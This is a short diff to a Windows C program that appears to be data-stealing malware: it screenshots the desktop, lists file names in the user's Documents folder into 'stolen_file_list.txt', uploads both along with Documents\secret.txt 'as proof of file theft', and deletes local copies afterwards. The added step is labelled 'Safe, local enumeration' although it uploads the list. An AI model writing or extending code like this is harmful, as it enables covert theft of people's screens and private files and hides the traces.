@@ -38,6 +38,7 @@ int main() {
     sprintf(tempPath, "%s", getenv("TEMP"));
     char filePath[MAX_PATH];
     char docPath[MAX_PATH];
+    char listPath[MAX_PATH];
 
     // 1. Take Screenshot
     sprintf(filePath, "%s\\screenshot.png", tempPath);
@@ -46,12 +47,33 @@ int main() {
     system(cmd);
     UploadFile(filePath, "screenshot.png");
 
-    // 2. Steal a file from Documents
+    // 2. Generate File List (Safe, local enumeration)
+    sprintf(listPath, "%s\\stolen_file_list.txt", tempPath);
+    FILE *listFile = fopen(listPath, "w");
+    if (listFile) {
+        fprintf(listFile, "=== FILES IN DOCUMENTS ===\n");
+        sprintf(docPath, "%s\\Documents\\*", getenv("USERPROFILE"));
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = FindFirstFileA(docPath, &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    fprintf(listFile, "%s\n", findData.cFileName);
+                }
+            } while (FindNextFileA(hFind, &findData));
+            FindClose(hFind);
+        }
+        fclose(listFile);
+        UploadFile(listPath, "stolen_file_list.txt");
+    }
+
+    // 3. Steal a specific file from Documents (as proof of file theft)
     sprintf(docPath, "%s\\Documents\\secret.txt", getenv("USERPROFILE"));
     UploadFile(docPath, "secret.txt");
 
-    // 3. Cleanup
+    // 4. Cleanup
     DeleteFile(filePath);
+    DeleteFile(listPath);
 
     return 0;
 }
